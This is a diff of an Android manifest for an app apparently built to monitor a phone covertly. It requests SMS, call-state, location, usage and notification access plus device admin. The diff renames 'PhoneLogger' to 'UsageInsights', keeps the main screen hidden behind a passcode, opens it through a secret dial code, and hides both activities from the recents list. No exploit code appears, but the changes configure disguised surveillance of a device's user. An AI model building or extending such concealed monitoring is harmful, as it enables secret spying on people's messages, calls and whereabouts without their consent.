@@ -8,7 +8,6 @@
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
 
     <!-- Location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -17,11 +16,8 @@
     <!-- NFC trigger -->
     <uses-permission android:name="android.permission.NFC" />
 
-    <!-- Volume button trigger -->
-    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
-        tools:ignore="ProtectedPermissions" />
+    <!-- Volume button trigger (BIND_ACCESSIBILITY_SERVICE is a protected permission — declared on the service, not here) -->
 
-    <!-- Shake trigger -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
     <!-- App usage stats -->
@@ -46,8 +42,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- Device Admin -->
-    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+    <!-- Device Admin (BIND_DEVICE_ADMIN is implied by the receiver — no uses-permission needed) -->
 
     <application
         android:allowBackup="false"
@@ -55,27 +50,29 @@
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/Theme.PhoneLogger">
+        android:theme="@style/Theme.UsageInsights">
 
         <!-- LockActivity: first screen shown by all trigger methods -->
         <activity
             android:name=".ui.LockActivity"
             android:exported="true"
+            android:excludeFromRecents="true"
             android:launchMode="singleTop"
-            android:theme="@style/Theme.PhoneLogger.Lock" />
+            android:theme="@style/Theme.UsageInsights.Lock" />
 
         <!-- Hidden MainActivity — opened only after correct passcode -->
         <activity
             android:name=".ui.MainActivity"
             android:exported="false"
+            android:excludeFromRecents="true"
             android:launchMode="singleTop"
-            android:theme="@style/Theme.PhoneLogger" />
+            android:theme="@style/Theme.UsageInsights" />
 
-        <!-- Disabled-by-default launcher alias; toggled by the App tab -->
+        <!-- Launcher alias; toggled by the App tab (enabled = icon visible) -->
         <activity-alias
             android:name=".ui.LauncherAlias"
             android:targetActivity=".ui.LockActivity"
-            android:enabled="false"
+            android:enabled="true"
             android:exported="true"
             android:icon="@mipmap/ic_launcher"
             android:label="@string/app_name">
@@ -85,15 +82,23 @@
             </intent-filter>
         </activity-alias>
 
-        <!-- Secret dial code receiver. Host matches default *#00000# — change in secrets.xml -->
+        <!-- Secret dial code receiver. Host matches default *#01234# — change in secrets.xml -->
         <receiver
             android:name=".receivers.SecretCodeReceiver"
             android:exported="true">
-            <intent-filter>
+            <!-- Modern action (Android 4.0+) -->
+            <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
                 <data
                     android:scheme="android_secret_code"
-                    android:host="00000" />
+                    android:host="01234" />
+            </intent-filter>
+            <!-- Legacy action (some Samsung/older OEM firmware) -->
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.SECRET_CODE" />
+                <data
+                    android:scheme="android_secret_code"
+                    android:host="01234" />
             </intent-filter>
         </receiver>
 
@@ -112,7 +117,6 @@
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.PHONE_STATE" />
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
 
@@ -188,11 +192,6 @@
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
-
-        <!-- Shake detection service -->
-        <service
-            android:name=".services.ShakeDetectionService"
-            android:exported="false" />
 
         <!-- Volume / Accessibility service -->
         <service
